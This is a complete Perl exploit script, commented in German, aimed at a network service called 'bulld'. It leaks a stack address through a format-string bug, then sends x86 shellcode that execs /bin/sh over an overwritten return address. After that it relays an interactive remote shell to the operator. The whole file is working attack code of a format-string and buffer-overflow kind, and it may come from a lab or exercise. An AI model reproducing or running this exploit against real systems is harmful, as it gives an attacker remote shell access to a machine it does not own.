#!/usr/bin/perl -w
use strict;
use IO::Socket; 


if ($#ARGV != 1 && $#ARGV != 0) {
    print "Evil bulld exploit\n";
    print "aufrufen mit <ip> [<port>]\n";
    exit;
}

my $handle = IO::Socket::INET->new( Proto     => "tcp",                                                                  
                                    PeerAddr  => $ARGV[0],
                                    PeerPort  => defined($ARGV[1])?$ARGV[1]:55988) or die "cannot establish connection: $!";
$handle->autoflush(1);

# rumgedup()e und dann shell exec()
#                         ___ zu duppender fd
#                        /
#                       v
my $shellcode = "\xbb\x04\x00\x00\x00\x31\xc9\xb8".
                "\x3f\x00\x00\x00\xcd\x80\x41\x83".
                "\xf9\x03\x75\xf3\x31\xd2\x52\x68".
                "\x6e\x2f\x73\x68\x68\x2f\x2f\x62".
                "\x69\x89\xe3\x52\x53\x89\xe1\x8d".
                "\x42\x0b\xcd\x80";

# Addresse von "in" innerhalb von bulld 
my $bufaddr; 

print STDOUT "Sende formatstring...\n";
print $handle "%p %p %p %p %p %p %p %p %p %p %p\n";

# Antworten auswerten
while (defined (my $line = <$handle>)) {
    if ($line =~ s/> Unknown command: (.*)/$1/) {
        my @argl = split(' ', $line);
        print STDOUT "&in: ".$argl[10]."\n";
        $bufaddr = hex $argl[10];
        last;
    }
}

print STDOUT "Sende Shellcode...\n";
print $handle $shellcode . (pack "l",$bufaddr) x 120 . "\n";

print STDOUT "Viel Spass mit der Shell...\n";
print $handle "cat /proc/version\n";

die "can't fork: $!" unless defined(my $childpid = fork());
if ($childpid) {
    while (defined (my $line = <$handle>)) {
        print STDOUT $line;
    }
    kill("TERM", $childpid);
} else {
    while (defined (my $line = <STDIN>)) {
        print $handle $line;
    }
}

